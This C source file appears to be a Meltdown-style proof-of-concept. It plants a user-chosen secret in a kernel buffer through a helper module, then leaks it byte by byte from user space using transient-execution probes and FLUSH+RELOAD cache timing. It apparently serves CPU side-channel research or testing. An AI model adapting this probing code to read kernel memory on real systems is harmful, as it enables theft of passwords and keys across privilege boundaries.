#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>
#include <x86intrin.h>

#include <sys/mman.h>

#include <args.h>
#include <memkit.h>
#include <utils.h>

size_t secret_len;

int main(int argc, char *argv[])
{
	struct hit_count results[256];
	struct args args;
	unsigned char *leak;
	unsigned char *buffer;
	unsigned char *kmem;
	size_t i, k, round;
	size_t count;

	if (parse_args(&args, argc, argv) < 0) {
		fprintf(stderr, "usage: %s [<options>]\n", argv[0]);
		return -1;
	}

	secret_len = strlen(args.secret);

	/* Allocate the leak buffer. */
	leak = calloc(secret_len, sizeof *leak);

	if (!leak) {
		printf(" [-] unable to allocate the leak buffer\n");
		return -1;
	}

	printf(" [+] allocated the leak buffer\n");

	/* Set up memkit. */
	if (memkit_init() < 0) {
		printf(" [-] unable to set up memkit\n");
		goto err_free_leak;
	}

	printf(" [+] set up memkit\n");

	/* Allocate a kernel buffer. */
	kmem = vmalloc(4096);

	if (!kmem) {
		fprintf(stderr, " [-] unable to allocate kernel memory\n");
		goto err_memkit_exit;
	}

	printf(" [+] allocated kernel buffer at %p\n", kmem);

	/* Set the cacheability of the buffer. */
	if (set_cacheability(kmem, args.mem_type) < 0) {
		printf(" [-] unable to set the cacheability of the kernel buffer\n");
		goto err_vfree;
	}

	printf(" [+] set the kernel buffer to %s memory\n", mem_type_to_str(args.mem_type));

	/* Write the secret into the kernel buffer. */
	if (kmem_write(args.secret, secret_len, kmem) < secret_len) {
		fprintf(stderr, " [-] unable to write secret to kernel memory\n");
		goto err_vfree;
	}

	printf(" [+] wrote secret \"%s\" to kernel buffer at %p\n", args.secret, kmem);

	/* Allocate a buffer for FLUSH + RELOAD. */
	buffer = mmap(NULL, 256 * 4096, PROT_READ | PROT_WRITE,
		MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);

	if (buffer == MAP_FAILED) {
		printf(" [-] unable to allocate the FLUSH + RELOAD buffer\n");
		goto err_vfree;
	}

	memset(buffer, 0, 256 * 4096);
	printf(" [+] allocated a buffer for FLUSH + RELOAD\n");

	for (i = 0; i < secret_len; ++i) {
		/* Reset the results. */
		clear_results(results);

		for (round = 0; round < args.rounds; ++round) {
			/* Keep the kernel data in the L1d cache. */
			kload(kmem + i);

			/* Flush the FLUSH + RELOAD buffer. */
			for (k = 0; k < 256; ++k) {
				_mm_clflush(buffer + ((k + round) % 256) * STRIDE);
			}

			_mm_mfence();

			/* Try to leak the kernel buffer from the L1d cache. */
#ifdef TSX
			tsx_probe(buffer, kmem + i);
#else
			retpol_probe(buffer, kmem + i);
#endif

			/* Reconstruct the value by timing the FLUSH + RELOAD buffer. */
			time_buffer(results, buffer, args.threshold);
		}

		/* Find the value that got the most hits. */
		match_best(leak + i, &count, results);
	}

	/* Display the result. */
	print_result(leak, secret_len, kmem);

	/* Clean up. */
	munmap(buffer, 256 * 4096);
	vfree(kmem);
	memkit_exit();

	return 0;

err_vfree:
	vfree(kmem);
err_memkit_exit:
	memkit_exit();
err_free_leak:
	free(leak);
	return -1;
}

